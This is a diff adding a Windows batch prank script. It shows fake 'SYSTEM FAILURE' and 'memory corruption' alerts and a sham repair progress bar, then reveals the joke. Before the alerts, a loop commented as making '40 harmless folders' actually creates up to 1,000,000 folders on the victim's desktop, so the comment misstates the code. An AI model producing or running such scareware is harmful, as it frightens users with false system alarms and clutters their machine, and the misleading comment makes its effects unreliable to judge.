@@ -1,0 +1,68 @@
+@echo off
+title CRITICAL SYSTEM FAILURE
+color 0c
+mode 1000
+
+:: FIRST — Create 40 harmless folders instantly
+set desktop=%userprofile%\Desktop
+for /l %%i in (1,1,1000000) do (
+    mkdir "%desktop%\JJ HAHA! %%i"
+)
+
+:: Dramatic Warning #1
+cls
+echo ***********************************************
+echo *               SYSTEM WARNING                *
+echo ***********************************************
+echo *  Unauthorized process detected!             *
+echo *  Severity Level: CRITICAL                   *
+echo *  DO NOT CLOSE                               *
+echo ***********************************************
+timeout /t 2 >nul
+
+:: Dramatic Warning #2
+cls
+echo ***********************************************
+echo *               SYSTEM ALERT                  *
+echo ***********************************************
+echo *  Memory corruption detected!                *
+echo *  Attempting emergency repair...             *
+echo *  DO NOT CLOSE                               *
+echo ***********************************************
+timeout /t 2 >nul
+
+:: Dramatic Warning #3
+cls
+echo ***********************************************
+echo *               SYSTEM FAILURE                *
+echo ***********************************************
+echo *  System integrity compromised!              *
+echo *  Reboot required immediately!               *
+echo *  DO NOT CLOSE                               *
+echo ***********************************************
+timeout /t 2 >nul
+
+:: Fake Loading Bar
+cls
+setlocal enabledelayedexpansion
+set bar=
+for /l %%i in (1,1,30) do (
+    set bar=!bar!#
+    cls
+    color 0c
+    echo SYSTEM REPAIR IN PROGRESS...
+    echo [!bar!] %%i/30
+    echo DO NOT CLOSE
+    timeout /t 1 >nul
+)
+
+:: Final Reveal Message
+cls
+color 0a
+echo ***********************************************
+echo *        HAHHA U FELL FOR IT BRUHHHH          *
+echo ***********************************************
+echo.
+echo Press any key to exit...
+pause >nul
+exit
